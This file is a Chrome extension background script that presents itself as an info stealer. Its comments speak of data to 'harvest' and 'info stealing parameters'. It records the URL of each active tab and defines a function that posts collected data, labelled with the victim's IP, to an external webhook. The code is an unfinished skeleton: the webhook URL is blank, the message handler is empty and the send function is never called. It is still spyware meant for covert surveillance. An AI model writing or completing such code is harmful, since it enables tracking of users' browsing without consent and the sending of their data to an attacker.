// global variables relevant to webhook deployment
const url = ""; // webhook url goes here

// global variables related to the info we will harvest
let ip = undefined;
let lastActiveTab = undefined;

// settings related files
const config = {
    buffered_sending: false, // turn on if you want to send data only on page loads
}

// webhook related functions
function send_webhook(msg) {
    // webhook specific parameters
    const params = {
        username: ip,
        avatar_url: "",
        content: msg,
    };

    // sending as post request to the webhook url
    fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: params
    });
}

// global listeners that listen to content script loading and passes
// the info stealing parameters.
chrome.runtime.onMessage.addListener((message, sender, reply) => {
    if (message === "script-first-load") {
        
    }
});

// global listeners that listen to chrome events and are then perform
// actions depending on the config file.
/**
 * Listens to when the active tab is changed (i.e., click to new
 * tab).
*/
chrome.tabs.onActivated.addListener(
    (activeInfo) => {
        chrome.tabs.get(activeInfo.tabId, (tab)=> {
            lastActiveTab = tab.url;
        });
    }
);

/**
 * Listens to when we've fully loaded a webpage.
 */
chrome.webNavigation.onCompleted.addListener((details) => {
    lastActiveTab = details.url;
});